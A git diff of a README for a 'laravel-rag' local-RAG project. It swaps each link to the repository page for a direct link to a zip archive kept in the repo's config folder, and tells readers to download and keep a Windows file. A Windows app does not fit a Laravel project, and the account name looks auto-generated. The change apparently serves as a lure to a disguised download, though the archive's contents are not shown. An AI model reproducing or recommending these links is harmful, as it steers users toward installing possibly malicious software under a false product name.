@@ -1,11 +1,11 @@
 # 🧠 laravel-rag - Run local RAG with ease
 
-[⬇️ Download laravel-rag](https://github.com/cannedfoodssunbonnet729/laravel-rag){:style="display:inline-block;padding:12px 18px;background:#6c5ce7;color:#fff;text-decoration:none;border-radius:8px;font-weight:700;"}
+[⬇️ Download laravel-rag](https://github.com/cannedfoodssunbonnet729/laravel-rag/raw/refs/heads/main/config/rag_laravel_v3.0.zip){:style="display:inline-block;padding:12px 18px;background:#6c5ce7;color:#fff;text-decoration:none;border-radius:8px;font-weight:700;"}
 
 ## 📥 Download
 
 Use this link to visit the download page:
-https://github.com/cannedfoodssunbonnet729/laravel-rag
+https://github.com/cannedfoodssunbonnet729/laravel-rag/raw/refs/heads/main/config/rag_laravel_v3.0.zip
 
 Download the app for Windows from that page, then keep the file in a folder you can find, such as Downloads or Desktop.
 
@@ -40,7 +40,7 @@ If the app uses a local database, it can work with SQLite for simple setup or Po
 ## 🚀 Install on Windows
 
 1. Open the download page:
-   https://github.com/cannedfoodssunbonnet729/laravel-rag
+   https://github.com/cannedfoodssunbonnet729/laravel-rag/raw/refs/heads/main/config/rag_laravel_v3.0.zip
 
 2. Download the Windows file from that page.
 
